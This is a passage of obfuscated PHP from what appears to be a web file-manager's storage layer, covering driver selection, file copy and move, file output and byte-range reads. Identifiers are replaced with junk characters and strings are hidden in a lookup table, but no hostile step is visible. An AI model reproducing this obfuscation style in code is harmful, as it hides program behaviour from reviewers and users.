Model($ØêÂƒœˆ[864])->where($æï›¶¨¡)->field($ØêÂƒœˆ[542])->select(); $Ã³×˜ = array_merge($Ã³×˜, array_to_keyvalue($İ´öÏ¯§, $ØêÂƒœˆ[12], $ØêÂƒœˆ[541])); return !1; } private function _fileFilter($óè±Ú€Â) { $•è†şÚ =& $_SERVER[ˆ¡¹µ‹Â]; return; if (empty($óè±Ú€Â)) { return; } $ÍıÜÙ¢æ = array($•è†şÚ[541] => array($•è†şÚ[7], array_unique($óè±Ú€Â))); $ö„¹¡š = Model($•è†şÚ[899])->where($ÍıÜÙ¢æ)->field($•è†şÚ[193])->select(); foreach ($ö„¹¡š as $µôìšÜ¯) { Model($•è†şÚ[899])->remove($µôìšÜ¯[$•è†şÚ[193]], !1); } } private function storeIds() { $³¯şº™ğ =& $_SERVER[ˆ¡¹µ‹Â]; $¸À±Šøø = Model($³¯şº™ğ[834])->listData(); $ûŠ°Ôœë = array(); $§åÈ—Ûª = $GLOBALS[$³¯şº™ğ[6]][$³¯şº™ğ[92]][$³¯şº™ğ[900]]; foreach ($¸À±Šøø as $ä¤ğÔ„¬) { $äôÑÆÀ = strtolower($ä¤ğÔ„¬[$³¯şº™ğ[98]]); if (!isset($§åÈ—Ûª[$äôÑÆÀ])) { continue; } $Şˆîõ£Ø = $³¯şº™ğ[77] . (isset($§åÈ—Ûª[$äôÑÆÀ]) ? $§åÈ—Ûª[$äôÑÆÀ] : ucfirst($äôÑÆÀ)); if (!class_exists($Şˆîõ£Ø)) { continue; } $ûŠ°Ôœë[] = $ä¤ğÔ„¬[$³¯şº™ğ[475]]; } return $ûŠ°Ôœë; } } goto dßšÁËÁ©; aôÄ‡Û­…: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ŠèÔ«±¦, $£í¼®±Û) { $ûğî³¾È =& $_SERVER[ˆ¡¹µ‹Â]; $î¹ç‡ÑÌ = $£í¼®±Û; $GLOBALS[$ûğî³¾È[1220]] = $ûğî³¾È[1221] . $ŠèÔ«±¦; Hook::trigger($ûğî³¾È[1221] . $ŠèÔ«±¦ . $ûğî³¾È[1222], $î¹ç‡ÑÌ); $¹ßÅÖº = self::driverMake($£í¼®±Û[0]); if (!$¹ßÅÖº) { return !1; } if (method_exists($¹ßÅÖº, $ŠèÔ«±¦)) { $êÅœ÷”¶ = @call_user_func_array(array($¹ßÅÖº, $ŠèÔ«±¦), $£í¼®±Û); } else { if (method_exists($¹ßÅÖº, $ûğî³¾È[1223])) { $êÅœ÷”¶ = @call_user_func_array(array($¹ßÅÖº, $ŠèÔ«±¦), $£í¼®±Û); } else { if (method_exists(self, $ŠèÔ«±¦)) { $êÅœ÷”¶ = @call_user_func_array(array(self, $ŠèÔ«±¦), $£í¼®±Û); } else { $êÅœ÷”¶ = call_user_func_array(array(parent, $ŠèÔ«±¦), $£í¼®±Û); } } } Hook::trigger($ûğî³¾È[1221] . $ŠèÔ«±¦ . $ûğî³¾È[1224], $î¹ç‡ÑÌ, $êÅœ÷”¶); return $êÅœ÷”¶; } public static function init($õâ£ÜÛ¼) { return self::driverMake($õâ£ÜÛ¼); } public static function copy($Ö«ø÷Ãó, $öµê––¨, $õ·¤ßÌ = false, $öùıíœ = false) { return self::copyMoveStart($Ö«ø÷Ãó, $öµê––¨, $õ·¤ßÌ, $_SERVER[ˆ¡¹µ‹Â][618], $öùıíœ); } public static function move($ñĞÂ¥¥, $°ºæ­ò‰, $²â¹„²È = false, $ã¬¢éığ = false) { return self::copyMoveStart($ñĞÂ¥¥, $°ºæ­ò‰, $²â¹„²È, $_SERVER[ˆ¡¹µ‹Â][620], $ã¬¢éığ); } private static function copyMoveStart($Ìã·œç‚, $²‘—¡Œæ, $Çô¯Øè‹, $ä•¹Ì°, $¥èìĞüÔ) { $†·ÃÑæ =& $_SERVER[ˆ¡¹µ‹Â]; $šÜúÜøß = array($Ìã·œç‚, $²‘—¡Œæ, $Çô¯Øè‹, $¥èìĞüÔ); Hook::trigger($†·ÃÑæ[1221] . $ä•¹Ì° . $†·ÃÑæ[1222], $šÜúÜøß); $¸¢Üè… = self::copyMove($Ìã·œç‚, $²‘—¡Œæ, $Çô¯Øè‹, $ä•¹Ì°, $¥èìĞüÔ); Hook::trigger($†·ÃÑæ[1221] . $ä•¹Ì° . $†·ÃÑæ[1224], $šÜúÜøß, $¸¢Üè…); return $¸¢Üè…; } public static function saveFile($É„Ş©˜…, $°”‹ƒÉÑ, $õ‘®ØĞ÷ = true) { $¶É»Çç =& $_SERVER[ˆ¡¹µ‹Â]; $ªŸ´†Óš = self::info($°”‹ƒÉÑ); $óïÌéü  = self::driverMake($É„Ş©˜…); $¦´¨ê = self::driverMake($°”‹ƒÉÑ); $Ì úßõß = !1; if ($¦´¨ê->pathParse[$¶É»Çç[1225]]) { $Ì úßõß = $¦´¨ê; $Å‘¾™ö³ = $¦´¨ê->pathParse[$¶É»Çç[1225]]; $¦´¨ê = self::driverMake($Å‘¾™ö³); } if ($óïÌéü ->pathParse[$¶É»Çç[1225]]) { $ôˆÅûœì = $óïÌéü ->pathParse[$¶É»Çç[1225]]; $óïÌéü  = self::driverMake($ôˆÅûœì); } $âš»×ü½ = $¦´¨ê->pathFather($°”‹ƒÉÑ); $’“ìŸ³â = !0; if (!$õ‘®ØĞ÷ && self::driverIsSame($óïÌéü , $¦´¨ê)) { $’“ìŸ³â = !1; } $£ ¿šÌ‡ = self::copyFile($óïÌéü , $É„Ş©˜…, $¦´¨ê, $âš»×ü½, $ªŸ´†Óš[$¶É»Çç[32]], $’“ìŸ³â); if ($Ì úßõß) { $£ ¿šÌ‡ = $Ì úßõß->getPathOuter($£ ¿šÌ‡); } return $£ ¿šÌ‡; } private static function copyMove($«˜ºëúÅ, $É”„«Ëˆ, $Êøäğ½ù, $‘Ë´ßí, $‚¼€ıÙ¸ = false) { $³èÏ¥ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$«˜ºëúÅ || $«˜ºëúÅ == $³èÏ¥[8] || !$É”„«Ëˆ) { return !1; } ignore_timeout(); $¨­İİØ = self::driverMake($«˜ºëúÅ); $¼ØÏâîÕ = self::driverMake($É”„«Ëˆ); $™Ç‹”Û“ = $‘Ë´ßí == $³èÏ¥[620]; $›Â×€È˜ = !1; if ($¼ØÏâîÕ->pathParse[$³èÏ¥[1225]]) { $›Â×€È˜ = $¼ØÏâîÕ; $É”„«Ëˆ = $¼ØÏâîÕ->pathParse[$³èÏ¥[1225]]; $¼ØÏâîÕ = self::driverMake($É”„«Ëˆ); } if ($¨­İİØ->pathParse[$³èÏ¥[1225]]) { $«˜ºëúÅ = $¨­İİØ->pathParse[$³èÏ¥[1225]]; $¨­İİØ = self::driverMake($«˜ºëúÅ); } self::check($¨­İİØ, $«˜ºëúÅ, $¼ØÏâîÕ, $É”„«Ëˆ); Hook::trigger($³èÏ¥[1226], $¨­İİØ, $«˜ºëúÅ, $¼ØÏâîÕ, $É”„«Ëˆ); $ÂŒ˜®©  = self::driverIsSame($¨­İİØ, $¼ØÏâîÕ); if ($ÂŒ˜®© ) { if ($‘Ë´ßí == $³èÏ¥[620] && !method_exists($¼ØÏâîÕ, $³èÏ¥[1227]) && trim($É”„«Ëˆ, $³èÏ¥[8]) == trim($¼ØÏâîÕ->pathFather($«˜ºëúÅ), $³èÏ¥[8])) { if ($¨­İİØ->pathThis($«˜ºëúÅ) != $‚¼€ıÙ¸ && !$¨­İİØ->isOsDriver()) { return $¨­İİØ->rename($«˜ºëúÅ, $‚¼€ıÙ¸); } return $¼ØÏâîÕ->getPathOuter($«˜ºëúÅ); } if (method_exists($¼ØÏâîÕ, $‘Ë´ßí)) { return $¼ØÏâîÕ->{$‘Ë´ßí}($«˜ºëúÅ, $É”„«Ëˆ, $Êøäğ½ù, $‚¼€ıÙ¸); } } if ($ÂŒ˜®©  && $‘Ë´ßí == $³èÏ¥[620] && $¼ØÏâîÕ->getType() == $³èÏ¥[109]) { $õøûèÃñ = $¼ØÏâîÕ->movePath($«˜ºëúÅ, $É”„«Ëˆ, $‚¼€ıÙ¸); if ($õøûèÃñ) { return $õøûèÃñ; } } $íÀƒµ = $¨­İİØ->isFile($«˜ºëúÅ); if (!$íÀƒµ && $¼ØÏâîÕ->getType() == $³èÏ¥[824] && $¨­İİØ->getType() == $³èÏ¥[109]) { $õøûèÃñ = $¼ØÏâîÕ->copyFolderFromIO($¨­İİØ, $«˜ºëúÅ, $É”„«Ëˆ, $Êøäğ½ù, $™Ç‹”Û“, $‚¼€ıÙ¸); } else { $õøûèÃñ = self::copyPath($¨­İİØ, $«˜ºëúÅ, $¼ØÏâîÕ, $É”„«Ëˆ, $Êøäğ½ù, $™Ç‹”Û“, $íÀƒµ, $‚¼€ıÙ¸); } if ($õøûèÃñ && $™Ç‹”Û“) { $¨­İİØ->remove($«˜ºëúÅ); } if ($›Â×€È˜) { $õøûèÃñ = $›Â×€È˜->getPathOuter($õøûèÃñ); } return $õøûèÃñ; } private static function check($ˆ¾Ä¶ªŞ, $€İ¥¤ˆ, $ÂâÅâ¯Ô, &$ãÀ€÷“¢) { $–òªšÁğ =& $_SERVER[ˆ¡¹µ‹Â]; if (self::driverIsSame($ˆ¾Ä¶ªŞ, $ÂâÅâ¯Ô) && $ˆ¾Ä¶ªŞ->isFolder($€İ¥¤ˆ) && $ˆ¾Ä¶ªŞ->isParentOf($€İ¥¤ˆ, $ãÀ€÷“¢)) { show_json(LNG($–òªšÁğ[1228]), !1); } if (!$ˆ¾Ä¶ªŞ->exist($€İ¥¤ˆ)) { show_json(LNG($–òªšÁğ[108]), !1); } } private static function copyPath($Ÿó¹ì¥…, $”ë¢ä¢·, $ıîÑŞ¿, $ƒÈ¤¢º¤, $‹¿­¨ïâ, $¬¶¨“”, $·ì“¬ºÊ, $—¬¥õ¨˜ = false, $˜°èî™İ = true) { $ç¸ø£å° =& $_SERVER[ˆ¡¹µ‹Â]; $›òÚ•›® = empty($—¬¥õ¨˜) && $—¬¥õ¨˜ !== $ç¸ø£å°[228] ? $Ÿó¹ì¥…->pathThis($”ë¢ä¢·) : $—¬¥õ¨˜; if ($‹¿­¨ïâ) { $„æÔåª€ = $ıîÑŞ¿->fileNameExist($ƒÈ¤¢º¤, $›òÚ•›®); $íğ÷§Áœ = $›òÚ•›®; $›òÚ•›® = $ıîÑŞ¿->fileNameAuto($ƒÈ¤¢º¤, $›òÚ•›®, $‹¿­¨ïâ, !$·ì“¬ºÊ); if (!$„æÔåª€ || $íğ÷§Áœ != $›òÚ•›®) { $‹¿­¨ïâ = !1; } if ($˜°èî™İ && !$‹¿­¨ïâ) { $ıîÑŞ¿->_data[$ç¸ø£å°[1229]] = !0; } } if ($·ì“¬ºÊ) { return self::copyFile($Ÿó¹ì¥…, $”ë¢ä¢·, $ıîÑŞ¿, $ƒÈ¤¢º¤, $›òÚ•›®, $¬¶¨“”); } if ($‹¿­¨ïâ == REPEAT_RENAME_FOLDER) { $‹¿­¨ïâ = !1; } $‡ÚÈ‚ = rtrim($ƒÈ¤¢º¤, $ç¸ø£å°[8]) . $ç¸ø£å°[8] . $›òÚ•›®; $¥ÏÓÇõ¯ = $ıîÑŞ¿->mkdir($ıîÑŞ¿->getPath($‡ÚÈ‚), $‹¿­¨ïâ); $ƒÈ¤¢º¤ = $ıîÑŞ¿->getPathInner($¥ÏÓÇõ¯); $İ™ÈÁŸ’ = $Ÿó¹ì¥…->listPath($”ë¢ä¢·, !0); $İ™ÈÁŸ’ = is_array($İ™ÈÁŸ’) ? $İ™ÈÁŸ’ : array($ç¸ø£å°[86] => array(), $ç¸ø£å°[85] => array()); $©²àéûÕ = array_merge($İ™ÈÁŸ’[$ç¸ø£å°[86]], $İ™ÈÁŸ’[$ç¸ø£å°[85]]); foreach ($©²àéûÕ as $“è†÷ş÷) { $êşåÆÃí = $“è†÷ş÷[$ç¸ø£å°[33]] == $ç¸ø£å°[230]; $”ë¢ä¢· = $Ÿó¹ì¥…->getPathInner($“è†÷ş÷[$ç¸ø£å°[87]]); $›øÛ¢Œ = self::copyPath($Ÿó¹ì¥…, $”ë¢ä¢·, $ıîÑŞ¿, $ƒÈ¤¢º¤, $‹¿­¨ïâ, $¬¶¨“”, $êşåÆÃí, !1, !1); if (!$›øÛ¢Œ) { IO::errorTips($ç¸ø£å°[1230] . $”ë¢ä¢· . $ç¸ø£å°[73] . $ƒÈ¤¢º¤); } } self::copyMoveKeepInfo($Ÿó¹ì¥…, $”ë¢ä¢·, $¥ÏÓÇõ¯); return $¥ÏÓÇõ¯; } private static function copyFile($éñ ôÇê, $‘¦Şö„, $Ä×ã”ŒÚ, $ãÙ›¡¹Ø, $•³—¸Èå, $„™ş¤éƒ) { $İ ñ·İÒ =& $_SERVER[ˆ¡¹µ‹Â]; $ãÙ›¡¹Ø = $Ä×ã”ŒÚ->getPath(rtrim($ãÙ›¡¹Ø, $İ ñ·İÒ[8]) . $İ ñ·İÒ[8] . $•³—¸Èå); $ƒ¡±õÄÍ = $İ ñ·İÒ[1231] . time() . rand_string(5); Hook::trigger($İ ñ·İÒ[1232], $éñ ôÇê, $‘¦Şö„, $Ä×ã”ŒÚ, $ãÙ›¡¹Ø, $•³—¸Èå, $ƒ¡±õÄÍ); if (self::driverIsSame($éñ ôÇê, $Ä×ã”ŒÚ)) { if ($„™ş¤éƒ) { $µş¨¬Èû = $Ä×ã”ŒÚ->moveFile($‘¦Şö„, $ãÙ›¡¹Ø); } else { $µş¨¬Èû = $Ä×ã”ŒÚ->copyFile($‘¦Şö„, $ãÙ›¡¹Ø); } Hook::trigger($İ ñ·İÒ[1233], $éñ ôÇê, $‘¦Şö„, $Ä×ã”ŒÚ, $ãÙ›¡¹Ø, $•³—¸Èå, $µş¨¬Èû); self::copyMoveKeepInfo($éñ ôÇê, $‘¦Şö„, $µş¨¬Èû); return $µş¨¬Èû; } $çíÉÌÌ = TEMP_FILES; if ($GLOBALS[$İ ñ·İÒ[6]][$İ ñ·İÒ[92]][$İ ñ·İÒ[871]]) { $çíÉÌÌ = $GLOBALS[$İ ñ·İÒ[6]][$İ ñ·İÒ[92]][$İ ñ·İÒ[871]]; } $¡®ï¬Šâ = $çíÉÌÌ; mk_dir($¡®ï¬Šâ); $ÎÚ¤ŸÔ = $¡®ï¬Šâ . $ƒ¡±õÄÍ; $Ó«Íƒõõ = $ÎÚ¤ŸÔ; $ÎÚ¤ŸÔ = $éñ ôÇê->download($‘¦Şö„, $ÎÚ¤ŸÔ); $ÎÚ¤ŸÔ = $éñ ôÇê->iconvApp($ÎÚ¤ŸÔ); if (substr($ÎÚ¤ŸÔ, strlen($çíÉÌÌ)) == $çíÉÌÌ) { $„™ş¤éƒ = !0; } $µş¨¬Èû = $Ä×ã”ŒÚ->upload($ãÙ›¡¹Ø, $ÎÚ¤ŸÔ, $„™ş¤éƒ); self::remove($Ó«Íƒõõ); Hook::trigger($İ ñ·İÒ[1233], $éñ ôÇê, $‘¦Şö„, $Ä×ã”ŒÚ, $ãÙ›¡¹Ø, $•³—¸Èå, $µş¨¬Èû); self::copyMoveKeepInfo($éñ ôÇê, $‘¦Şö„, $µş¨¬Èû); return $µş¨¬Èû; } private static function copyMoveKeepInfo($ÀÔì¤Úİ, $ÅŠøÍıÂ, $Ò¤Æßƒº) { if (!$Ò¤Æßƒº) { return; } $¨ãÃÓÂ‰ = $ÀÔì¤Úİ->info($ÅŠøÍıÂ); if (!is_array($¨ãÃÓÂ‰)) { return; } IO::setModifyTime($Ò¤Æßƒº, $¨ãÃÓÂ‰[$_SERVER[ˆ¡¹µ‹Â][88]]); } public static function pathFather($»îì¦İÓ) { $Œ¯¾àÛ = IO::init($»îì¦İÓ); $´ä³´ëÜ = $Œ¯¾àÛ->pathFather($Œ¯¾àÛ->path); return $Œ¯¾àÛ->getPathOuter($´ä³´ëÜ); } public static function fileOut($Äñƒ®ô±, $¼œÍº = false, $€Ç“€ôÛ = false, $ó‡Ûı–Õ = '') { $¯ßøÎÔ = self::driverMake($Äñƒ®ô±); if ($¯ßøÎÔ->isFileOutServer()) { return $¯ßøÎÔ->fileOutServer($Äñƒ®ô±, $¼œÍº, $€Ç“€ôÛ, $ó‡Ûı–Õ); } return $¯ßøÎÔ->fileOut($Äñƒ®ô±, $¼œÍº, $€Ç“€ôÛ, $ó‡Ûı–Õ); } public static function fileOutImage($•—¿…, $Øùê¬§ = 250) { $ÀûÓ—Æô = array(250, 600, 1200, 2000, 3000, 5000); for ($ÈùÚ­¬… = 0; $ÈùÚ­¬… < count($ÀûÓ—Æô); $ÈùÚ­¬…++) { if ($ÈùÚ­¬… == 0 && $Øùê¬§ <= $ÀûÓ—Æô[$ÈùÚ­¬…]) { $Øùê¬§ = $ÀûÓ—Æô[$ÈùÚ­¬…]; break; } else { if ($Øùê¬§ > $ÀûÓ—Æô[$ÈùÚ­¬… - 1] && $Øùê¬§ <= $ÀûÓ—Æô[$ÈùÚ­¬…]) { $Øùê¬§ = $ÀûÓ—Æô[$ÈùÚ­¬…]; break; } else { if ($ÈùÚ­¬… == count($ÀûÓ—Æô) - 1 && $Øùê¬§ > $ÀûÓ—Æô[$ÈùÚ­¬…]) { $Øùê¬§ = $ÀûÓ—Æô[$ÈùÚ­¬…]; break; } } } } $Òšâ¡Ú = self::driverMake($•—¿…); if ($Òšâ¡Ú->isFileOutServer()) { return $Òšâ¡Ú->fileOutImageServer($•—¿…, $Øùê¬§); } return $Òšâ¡Ú->fileOutImage($•—¿…, $Øùê¬§); } private static function driverIsSame($Û¥¦º¡¶, $íö›ßøî) { $ÏšÂñï =& $_SERVER[ˆ¡¹µ‹Â]; $ï¾ã©•í = $Û¥¦º¡¶->getType(); $íùÙ™¸¨ = $íö›ßøî->getType(); if ($ï¾ã©•í != $íùÙ™¸¨) { return !1; } if ($ï¾ã©•í == $ÏšÂñï[824]) { return !0; } if ($ï¾ã©•í == $ÏšÂñï[109]) { return !0; } if ($Û¥¦º¡¶->pathDriver == $íö›ßøî->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ó¨‚Ÿµò, $âø°Œ¥š) { $Ñµó‚¯ =& $_SERVER[ˆ¡¹µ‹Â]; if (!IO::exist($Ó¨‚Ÿµò)) { return !1; } if (!IO::exist($âø°Œ¥š)) { IO::mkdir($âø°Œ¥š); } $¢Ğ˜ÎØ² = array_to_keyvalue(self::listAllSimple($Ó¨‚Ÿµò), $Ñµó‚¯[87]); $œ×ùâ•½ = array_to_keyvalue(self::listAllSimple($âø°Œ¥š), $Ñµó‚¯[87]); $‹Ò·³ = array(); $¬Ò¹Ø®ê = array(); foreach ($¢Ğ˜ÎØ² as $şåÛˆğœ => $ìÛĞ¡„Ö) { if (isset($œ×ùâ•½[$şåÛˆğœ])) { if ($ìÛĞ¡„Ö[$Ñµó‚¯[78]] == 1) { continue; } if ($œ×ùâ•½[$şåÛˆğœ][$Ñµó‚¯[79]] == $ìÛĞ¡„Ö[$Ñµó‚¯[79]]) { continue; } } if ($ìÛĞ¡„Ö[$Ñµó‚¯[78]] == 1) { $¬Ò¹Ø®ê[] = $âø°Œ¥š . $Ñµó‚¯[8] . trim($şåÛˆğœ, $Ñµó‚¯[8]); continue; } $¿ò¡‚ì÷ = strstr(trim($şåÛˆğœ, $Ñµó‚¯[8]), $Ñµó‚¯[8]) ? get_path_father($şåÛˆğœ) : $Ñµó‚¯[12]; $‹Ò·³[] = array($Ñµó‚¯[1234] => $ìÛĞ¡„Ö[$Ñµó‚¯[89]], $Ñµó‚¯[1235] => rtrim($âø°Œ¥š, $Ñµó‚¯[8]) . $Ñµó‚¯[8] . $¿ò¡‚ì÷, $Ñµó‚¯[1236] => $ìÛĞ¡„Ö); } $¶²Œ˜Šó = array($Ñµó‚¯[230] => $‹Ò·³, $Ñµó‚¯[78] => $¬Ò¹Ø®ê); Hook::trigger($Ñµó‚¯[1237], $Ó¨‚Ÿµò, $âø°Œ¥š, $¶²Œ˜Šó); foreach ($¬Ò¹Ø®ê as $ìÛĞ¡„Ö) { IO::mkdir($ìÛĞ¡„Ö); } foreach ($‹Ò·³ as $ìÛĞ¡„Ö) { IO::copy($ìÛĞ¡„Ö[$Ñµó‚¯[1234]], $ìÛĞ¡„Ö[$Ñµó‚¯[1235]], REPEAT_REPLACE); } } public static function fileSubstr($Å¹ÊÒÙ , $¹Ä”µÆ, $­íºşô… = false) { $ë®€Ë¯Û =& $_SERVER[ˆ¡¹µ‹Â]; $ğé‹¡Ï = self::driverMake($Å¹ÊÒÙ ); $«ê”»‹ø = $ğé‹¡Ï->size($Å¹ÊÒÙ ); $ğÌ—öêœ = $¹Ä”µÆ; $êÂ¯… = $­íºşô…; if ($¹Ä”µÆ < 0) { $¹Ä”µÆ = $«ê”»‹ø + $¹Ä”µÆ; } if ($­íºşô… === !1) { $­íºşô… = $«ê”»‹ø - $¹Ä”µÆ; } if ($¹Ä”µÆ + $­íºşô… > $«ê”»‹ø) { $­íºşô… = $«ê”»‹ø - $¹Ä”µÆ; } if (!$«ê”»‹ø && $ğé‹¡Ï->getType() == $ë®€Ë¯Û[109] && !$ğé‹¡Ï->exist($Å¹ÊÒÙ )) { $ú­ÛÜ½– = get_path_this($Å¹ÊÒÙ ); $ÀÒÔ’   = parse_url_query($ú­ÛÜ½–); if (is_array($ÀÒÔ’  ) && isset($ÀÒÔ’  [$ë®€Ë¯Û[32]])) { $ú­ÛÜ½– = urldecode($ÀÒÔ’  [$ë®€Ë¯Û[32]]); } throw new Exception($ë®€Ë¯Û[1238] . LNG($ë®€Ë¯Û[1239]) . $ë®€Ë¯Û[1037] . clear_html($ú­ÛÜ½–) . $ë®€Ë¯Û[12]); } if ($­íºşô… <= 0) { return $ë®€Ë¯Û[12]; } if ($¹Ä”µÆ < 0 || $¹Ä”µÆ >= $«ê”»‹ø || $­íºşô… > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\x65\x52\x65\141\x64\40\x65\x72\x72\157\x72\41\x20\163\x74\x61\162\x74\75{$¹Ä”µÆ}\x3b\x6c\145\x6e\x67\164\x68\x3d{$­íºşô…}\73\x20\x73\x69\172\x65\75{$«ê”»‹ø}\x3b"); } $éèƒ’Ò‹ = $ğé‹¡Ï->fileSubstr($Å¹ÊÒÙ , $¹Ä”µÆ, $­íºşô…); if (!$éèƒ’Ò‹ && $­íºşô… && isset($GLOBALS[$ë®€Ë¯Û[1240]])) { throw new Exception($GLOBALS[$ë®€Ë¯Û[1240]][$ë®€Ë¯Û[1241]]); } return $éèƒ’Ò‹; } private static function driverMake(&$¤“ÏìÅ) { $—òìü˜– =& $_SERVER[ˆ¡¹µ‹Â]; $Ê’°¢‘ = KodIO::parse($¤“ÏìÅ); if (!self::$driverListSystem) { $ÑÔ¼¼Åø = Model($—òìü˜–[834])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÑÔ¼¼Åø, $—òìü˜–[475]); } if ($Ê’°¢‘[$—òìü˜–[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ê’°¢‘[$—òìü˜–[475]]]) { throw new Exception($—òìü˜–[1242]); return !1; } $¤“ÏìÅ = $Ê’°¢‘[$—òìü˜–[1243]]; $É³â¤¼½ = self::driverGet($Ê’°¢‘, $¤“ÏìÅ); return $É³â¤¼½; } private static function driverGet($éƒĞ´ˆó, &$äöáˆ¾) { $¨ÕÛ€ó =& $_SERVER[ˆ¡¹µ‹Â]; $ÊéÑ¡¨„ = $éƒĞ´ˆó[$¨ÕÛ€ó[1244]]; $Í°İÆëÄ = $éƒĞ´ˆó[$¨ÕÛ€ó[475]]; switch ($éƒĞ´ˆó[$¨ÕÛ€ó[33]]) { case KodIO::KOD_IO: $†½¯âÉ = self::$driverListSystem[$Í°İÆëÄ]; break; case KodIO::KOD_SOURCE: $äöáˆ¾ = $Í°İÆëÄ . $äöáˆ¾; $†½¯âÉ = array($¨ÕÛ€ó[1245] => $¨ÕÛ€ó[1246], $¨ÕÛ€ó[6] => $éƒĞ´ˆó); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $«§»µŠ = $GLOBALS[$¨ÕÛ€ó[1247]]; self::$driverListUser = array_to_keyvalue($«§»µŠ, $¨ÕÛ€ó[475]); } $†½¯âÉ = self::$driverListUser[$Í°İÆëÄ]; break; case KodIO::KOD_SHARE_LINK: $†½¯âÉ = array($¨ÕÛ€ó[1245] => $¨ÕÛ€ó[1248], $¨ÕÛ€ó[6] => $éƒĞ´ˆó); $®»ùÓî© = Action($¨ÕÛ€ó[1249])->sharePathInfo($éƒĞ´ˆó[$¨ÕÛ€ó[87]]); $äöáˆ¾ = $®»ùÓî©[$¨ÕÛ€ó[193]]; if (!$®»ùÓî©[$¨ÕÛ€ó[193]]) { $Š³ğ«»Ô = Model($¨ÕÛ€ó[664])->getInfo($®»ùÓî©[$¨ÕÛ€ó[665]]); $äöáˆ¾ = KodIO::clear($Š³ğ«»Ô[$¨ÕÛ€ó[1250]] . $éƒĞ´ˆó[$¨ÕÛ€ó[1243]]); $éƒĞ´ˆó[$¨ÕÛ€ó[560]] = $Š³ğ«»Ô; $éƒĞ´ˆó[$¨ÕÛ€ó[1225]] = $äöáˆ¾; $†½¯âÉ = array($¨ÕÛ€ó[1245] => $¨ÕÛ€ó[1251], $¨ÕÛ€ó[6] => $éƒĞ´ˆó); } break; case KodIO::KOD_SHARE_ITEM: $†½¯âÉ = array($¨ÕÛ€ó[1245] => $¨ÕÛ€ó[1252], $¨ÕÛ€ó[6] => $éƒĞ´ˆó); $Š³ğ«»Ô = Model($¨ÕÛ€ó[664])->getInfo($éƒĞ´ˆó[$¨ÕÛ€ó[475]]); if ($Š³ğ«»Ô[$¨ÕÛ€ó[193]] == $¨ÕÛ€ó[228]) { $äöáˆ¾ = KodIO::clear($Š³ğ«»Ô[$¨ÕÛ€ó[1250]] . $éƒĞ´ˆó[$¨ÕÛ€ó[1243]]); $éƒĞ´ˆó[$¨ÕÛ€ó[560]] = $Š³ğ«»Ô; $éƒĞ´ˆó[$¨ÕÛ€ó[1225]] = $äöáˆ¾; $†½¯âÉ = array($¨ÕÛ€ó[1245] => $¨ÕÛ€ó[1253], $¨ÕÛ€ó[6] => $éƒĞ´ˆó); } else { if (!$äöáˆ¾) { $äöáˆ¾ = $Š³ğ«»Ô[$¨ÕÛ€ó[193]]; } } break; default: $äöáˆ¾ = $éƒĞ´ˆó[$¨ÕÛ€ó[87]]; $†½¯âÉ = array($¨ÕÛ€ó[1245] => $¨ÕÛ€ó[1254]); break; } $¨‰Êâ»Ó = $éƒĞ´ˆó[$¨ÕÛ€ó[87]]; if (!isset(self::$driverCache[$¨‰Êâ»Ó])) { $ÀÉŠ›°Ú = strtolower($†½¯âÉ[$¨ÕÛ€ó[98]]); $ÆùÄ¹ü = $GLOBALS[$¨ÕÛ€ó[6]][$¨ÕÛ€ó[92]][$¨ÕÛ€ó[900]]; $ÇÀõóÀİ = $¨ÕÛ€ó[77] . (isset($ÆùÄ¹ü[$ÀÉŠ›°Ú]) ? $ÆùÄ¹ü[$ÀÉŠ›°Ú] : ucfirst($ÀÉŠ›°Ú)); if (!class_exists($ÇÀõóÀİ)) { show_json("{$ÇÀõóÀİ}\x20\156\x6f\x74\40\145\x78\151\x73\x74\163\x21", !1); } $Õ™Õ½œ× = isset($†½¯âÉ[$¨ÕÛ€ó[6]]) ? $†½¯âÉ[$¨ÕÛ€ó[6]] : !1; self::$driverCache[$¨‰Êâ»Ó] = new $ÇÀõóÀİ($Õ™Õ½œ×); } $™âè”Ç„ = self::$driverCache[$¨‰Êâ»Ó]; $™âè”Ç„->pathDriver = $ÊéÑ¡¨„; $™âè”Ç„->pathBase = $¨ÕÛ€ó[12]; if (isset($†½¯âÉ[$¨ÕÛ€ó[6]][$¨ÕÛ€ó[1255]])) { $™âè”Ç„->pathBase = rtrim($†½¯âÉ[$¨ÕÛ€ó[6]][$¨ÕÛ€ó[1255]], $¨ÕÛ€ó[8]) . $¨ÕÛ€ó[8]; $äöáˆ¾ = $™âè”Ç„->pathBase . ltrim($äöáˆ¾, $¨ÕÛ€ó[8]); } $äöáˆ¾ = $™âè”Ç„->getPath($äöáˆ¾); if (isset($éƒĞ´ˆó[$¨ÕÛ€ó[1225]])) { $äöáˆ¾ = $éƒĞ´ˆó[$¨ÕÛ€ó[1225]]; } $™âè”Ç„->path = $äöáˆ¾; return $™âè”Ç„; } public static function errorTips($‡¶ÔÊ³ = false) { $ØÉçõ´Ğ =& $_SERVER[ˆ¡¹µ‹Â]; static $Î…ò´İ = array(); $à˜°Ô‡‹ = 1000; if ($‡¶ÔÊ³ === -1) { return $Î…ò´İ ? $Î…ò´İ[count($Î…ò´İ) - 1] : $ØÉçõ´Ğ[12]; } if ($‡¶ÔÊ³ === !1) { return implode($ØÉçõ´Ğ[262], $Î…ò´İ); } if (count($Î…ò´İ) >= $à˜°Ô‡‹) { $Î…ò´İ = array_slice($Î…ò´İ, $à˜°Ô‡‹ * 0.5, $à˜°Ô‡‹); } $Î…ò´İ[] = $‡¶ÔÊ³; write_log($ØÉçõ´Ğ[176] . ACTION . $ØÉçõ´Ğ[1256] . $‡¶ÔÊ³, $ØÉçõ´Ğ[1257]); } public static function getLastError($ˆÕ´Ÿç = '') { $õØ´¸‡³ = self::errorTips(-1); return $õØ´¸‡³ ? $õØ´¸‡³ : $ˆÕ´Ÿç; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $«îÀ›”›; if ($«îÀ›”›) { return $«îÀ›”›; } $­ØŸ³Œ = IO::init($_SERVER[ˆ¡¹µ‹Â][8]); return $­ØŸ³Œ; } private static function iconvSystem($ô…ÛÆ¹€) { return self::local()->iconvSystem($ô…ÛÆ¹€); } private static function 